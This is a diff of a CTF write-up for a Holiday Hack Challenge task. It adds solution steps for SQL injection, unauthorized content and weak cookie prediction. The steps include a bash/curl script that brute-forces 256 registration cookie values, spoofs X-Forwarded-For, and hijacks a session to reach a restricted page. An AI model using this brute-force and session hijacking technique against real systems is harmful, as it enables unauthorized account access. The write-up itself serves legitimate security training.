@@ -134,20 +134,88 @@ Testing the search interface for SQL Injection (SQLi), the application was found
 
 **Answer: SQL Injection**
 
+This reveals the unauthorized course and allows me to report it:
+![Unauthorized Course](/images/shroedingers_mischief.jpg)
 
-Ordered list:
-1. Item 1
-2. Item 2
-3. Item 3
+Opening the course details prompts for reporting:
+![Unauthorized Course Details](/images/shroedingers_gnomecourse.jpg) 
 
-Unordered list:
+**Answer: Unauthorized content**
 
-- Item
-- Item
-- Item
-/usr/local/weather/temperature
+The final hint suggests that a token or cookie may be weak. The error message when attempting to access the wip/holiday_behavior endpoint confirms this idea.
 
-**Answer: Flag or Answer**
+![Registration Value](/images/shroedingers_wipermissions.jpg) 
+
+Looking at the registration values generated:
+registration	eb72a05369dcb44d
+registration	eb72a05369dcb44d
+registration	eb72a05369dcb455
+registration	eb72a05369dcb453
+registration	eb72a05369dcb451
+registration	eb72a05369dcb454
+registration	eb72a05369dcb444
+registration	eb72a05369dcb445
+registration	eb72a05369dcb447
+registration	eb72a05369dcb449
+registration	eb72a05369dcb456
+registration	eb72a05369dcb448
+registration	eb72a05369dcb452
+registration	eb72a05369dcb44a
+registration	eb72a05369dcb443
+
+Only the last two digits change, this indicates there are only 256 variations.
+The TestUser needs to be logged in to test the registration values. 
+Using this script to locate the valid session:
+
+```sh
+#!/bin/bash
+prefix="eb72a05369dcb4"
+schrod="7c3ee3a7-6781-459b-8db9-eee63c05558b"
+id="48dd96c0-0794-41cf-96c1-bf3ddc555a30"
+
+for i in {0..255}; do
+  hex=$(printf '%02x' $i)
+  
+  # Login and access page in one flow
+  response=$(curl -s -L \
+    -H "X-Forwarded-For: 127.0.0.1" \
+    -H "Cookie: Schrodinger=$schrod; registration=${prefix}${hex}" \
+    -d "username=teststudent&password=2025h0L1d4y5" \
+    "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=$id" \
+    --next \
+    -H "X-Forwarded-For: 127.0.0.1" \
+    -H "Cookie: Schrodinger=$schrod; registration=${prefix}${hex}" \
+    "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/wip/holiday_behavior?id=$id")
+  
+  if ! echo "$response" | grep -qi "invalid"; then
+    echo "============================================"
+    echo "VALID REGISTRATION COOKIE FOUND!"
+    echo "registration=${prefix}${hex}"
+    echo "============================================"
+    echo ""
+    echo "$response"
+    echo ""
+    echo "============================================"
+    echo "Response saved to: /tmp/valid_${hex}.html"
+    echo "$response" > /tmp/valid_${hex}.html
+    exit 0
+  else
+    echo -n "."
+  fi
+done
+
+echo ""
+echo "No valid registration cookie found in range 00-ff"
+```
+
+This results in a VALID REGISTRATION COOKIE FOUND!
+registration=eb72a05369dcb44c
+
+Hijacking this session token, the document in wip is accessed.
+ 
+**Answer: Cookie prediction**
+
+![Final Assessment Results](/images/shroedingers_final.jpg) 
 
 </details>
 
